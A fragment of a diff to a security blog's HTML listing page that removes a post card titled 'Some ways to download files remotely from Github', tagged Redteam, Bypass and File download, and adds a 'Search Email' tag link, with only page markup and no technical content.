-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png" class="responsive-img" alt="Some ways to download files remotely from Github">
-                        
-                        <span class="card-title">Some ways to download files remotely from Github</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                    Miscellaneous record
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
-                    </a>
-                    
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
-                    </a>
-                    
-                    <a href="/tags/File-download/">
-                        <span class="chip bg-color">File download</span>
+                    <a href="/tags/Search-Email/">
+                        <span class="chip bg-color">Search Email</span>
                     </a>
                     
                 </div>
